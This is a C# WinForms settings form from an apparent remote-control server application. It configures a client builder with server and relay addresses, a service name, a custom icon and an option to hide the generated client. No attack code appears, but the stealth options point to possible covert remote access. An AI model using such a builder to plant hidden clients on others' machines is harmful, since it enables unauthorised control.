using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmSettings : FrmBase
    {
        public FrmSettings()
        {
            InitializeComponent();
            this.EnableCancelButton = true;
            this.pictureBoxAppIcon.Visible = false;
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            base.EnableCancelButton = true;
            this.textBoxServerIP.Text = Settings.CurrentSettings.ClientPara.ServerIP;
            this.textBoxServerPort.Text = Settings.CurrentSettings.ClientPara.ServerPort.ToString();
            this.textBoxServiceName.Text = string.IsNullOrWhiteSpace(Settings.CurrentSettings.ClientPara.ServiceName)
                ? "RemoteControlClient.exe"
                : Settings.CurrentSettings.ClientPara.ServiceName;
            this.textBoxLocalServerPort.Text = Settings.CurrentSettings.ServerPort.ToString();
            this.textBoxRelayIP.Text = Settings.CurrentSettings.RelayServerIP;
            this.textBoxRelayPort.Text = Settings.CurrentSettings.RelayServerPort.ToString();
            this.checkBoxHideClient.Checked = Settings.CurrentSettings.ClientPara.IsHide;
            string onlineAvatar = Settings.CurrentSettings.ClientPara.OnlineAvatar;
            string onlineAvatarPath = RSCApplication.GetPath(ePathType.AVATAR_DIR) + onlineAvatar;
            if (!string.IsNullOrWhiteSpace(onlineAvatarPath) && System.IO.File.Exists(onlineAvatarPath))
            {
                this.pictureBoxAvatar.Tag = onlineAvatar;
                SetPictureBoxImage(this.pictureBoxAvatar, onlineAvatarPath);
            }
            string clientIconPath = Settings.CurrentSettings.ClientPara.ClientIconPath;
            if (!string.IsNullOrWhiteSpace(clientIconPath))
            {
                // 支持相对路径：如果文件不存在则尝试在应用目录下查找
                if (!System.IO.File.Exists(clientIconPath))
                {
                    string resolved = System.IO.Path.Combine(
                        AppDomain.CurrentDomain.BaseDirectory,
                        System.IO.Path.GetFileName(clientIconPath));
                    if (System.IO.File.Exists(resolved))
                        clientIconPath = resolved;
                }
                if (System.IO.File.Exists(clientIconPath))
                {
                    this.pictureBoxAppIcon.Tag = clientIconPath;
                    SetPictureBoxImage(this.pictureBoxAppIcon, clientIconPath);
                    checkBoxAppIcon.Checked = true;
                }
            }
            settingsLoaded = true;
        }

        private static void SetPictureBoxImage(PictureBox pictureBox, string fileName)
        {
            if (pictureBox == null || string.IsNullOrEmpty(fileName) || !System.IO.File.Exists(fileName))
                return;

            try
            {
                Image oldImage = pictureBox.BackgroundImage;
                using (Image image = Image.FromFile(fileName))
                {
                    pictureBox.BackgroundImage = new Bitmap(image);
                }
                if (oldImage != null)
                    oldImage.Dispose();
            }
            catch
            {
                pictureBox.BackgroundImage = null;
            }
        }

        private void buttonSaveServerSetting_Click(object sender, EventArgs e)
        {
            if (SaveSettingsFromForm(true))
                this.Close();
        }

        private void buttonGenClient_Click(object sender, EventArgs e)
        {
            GenerateClient();
        }

        private void buttonSelectIP_Click(object sender, EventArgs e)
        {
            var ips = CommonUtil.GetIPAddressV4();
            ContextMenuStrip cms = new ContextMenuStrip();
            ips.ForEach(a =>
            {
                cms.Items.Add(a, null, (o, args) =>
                {
                    this.textBoxServerIP.Text = a;
                });
            });
            cms.Show(this.buttonSelectIP, new Point(0, buttonSelectIP.Height));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBoxAvatar_Click(object sender, EventArgs e)
        {
            var frm = new FrmSelectAvatar();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string avatarFile = frm.SelectedAvatarFile;
                string avatarFileName = System.IO.Path.GetFileName(avatarFile);
                this.pictureBoxAvatar.Tag = avatarFileName;
                SetPictureBoxImage(this.pictureBoxAvatar, avatarFile);
            }
        }

        private void pictureBoxAppIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            ofd.Title = "请选择图标";
            ofd.Filter = "*.ico|*.ico";
            ofd.FilterIndex = 1;
            // %appdata%\iconmaster\output
            string initFolder = System.IO.Path.Combine(Environment.GetEnvironmentVariable("appdata"), @"iconmaster\output");
            if(System.IO.Directory.Exists(initFolder))
                ofd.InitialDirectory = initFolder;
            if (ofd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
            {
                return;
            }
            this.pictureBoxAppIcon.Tag = ofd.FileName;
            SetPictureBoxImage(this.pictureBoxAppIcon, ofd.FileName);
        }

        private void checkBoxAppIcon_CheckedChanged(object sender, EventArgs e)
        {
            this.pictureBoxAppIcon.Visible = checkBoxAppIcon.Checked;
        }
    }
}
